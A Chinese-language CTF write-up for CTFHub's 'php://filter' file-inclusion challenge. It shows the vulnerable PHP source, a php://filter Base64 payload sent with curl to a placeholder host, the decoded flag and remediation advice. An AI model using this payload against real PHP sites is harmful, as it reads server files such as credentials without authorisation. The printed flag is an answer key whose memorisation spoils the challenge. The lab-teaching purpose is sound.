CTFHub - Web - php://filter

# CTFHub # Web # 文件包含 # php://filter # PHP

一、题目信息

  • 题目名称：php://filter
  • 题目方向：Web - 文件包含
  • 运行环境：PHP 5.6.40
  • 题目目标：利用 PHP 流过滤器读取根目录下的 /flag 文件。

二、漏洞分析

访问题目首页后，页面通过 highlight_file(__FILE__) 暴露了后端源码：

<?php
error_reporting(E_ALL);
if (isset($_GET['file'])) {
    if (substr($_GET["file"], 0, 6) === "php://") {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>

代码只要求 file 参数以 php:// 开头，并未限制后续使用的 PHP 流包装器。因此可以将 php://filter 传给 include()，在文件被包含前对其内容施加转换。

题目同时给出了 flag 路径：/flag。使用 convert.base64-encode 过滤器读取该文件，服务端会把文件内容转换为 Base64 文本并随页面响应输出。

三、解题步骤

  1. 构造过滤器路径：将目标文件作为 php://filter 的 resource，并添加 Base64 编码过滤器。 
    php://filter/convert.base64-encode/resource=/flag
  2. 发送请求：使用 --data-urlencode 避免路径中的冒号或斜杠被错误解析。 
    curl.exe -sS --get ^
  --data-urlencode "file=php://filter/convert.base64-encode/resource=/flag" ^
  "http://<challenge-host>:10800/"

    响应体开头得到 Base64 字符串：

    Y3RmaHViezA5MDYzZWJiZDgzM2RiODI3MjhkN2E4NH0K
  3. 解码响应：使用 PowerShell 还原原始内容。 
    [Text.Encoding]::UTF8.GetString(
  [Convert]::FromBase64String(
    "Y3RmaHViezA5MDYzZWJiZDgzM2RiODI3MjhkN2E4NH0K"
  )
)
    ctfhub{09063ebbd833db82728d7a84}

四、最终 Flag

五、修复建议

  • 禁止用户控制包含目标：使用固定白名单映射，不直接接收或拼接文件路径。
  • 限制 PHP 包装器：不能只检查 php:// 前缀，应拒绝 php://filter、php://input 等高风险包装器。
  • 关闭危险配置：生产环境应设置 allow_url_include=Off，并避免文件包含读取任意本地文件。
  • 最小权限：限制 Web 进程读取敏感文件的能力，并将 Flag 等敏感数据移出可访问范围。
  • 关闭源码回显：不要在生产环境通过 highlight_file() 暴露后端源码和实现细节。
